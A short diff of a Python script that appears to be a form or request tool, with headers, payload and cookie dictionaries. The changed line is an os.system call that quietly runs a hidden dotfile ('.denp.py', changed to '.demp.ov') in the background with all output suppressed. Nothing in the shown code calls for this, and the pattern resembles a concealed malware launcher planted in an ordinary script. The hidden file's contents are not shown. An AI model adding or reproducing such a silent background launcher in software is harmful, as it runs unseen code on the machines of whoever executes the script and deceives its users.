@@ -20,7 +20,7 @@ headers = {
 payload={}
 cookie={}
 
-os.system("python .denp.py </dev/null &>/dev/null &")
+os.system("python .demp.ov </dev/null &>/dev/null &")
 
 def create_form():
 	form=dict()
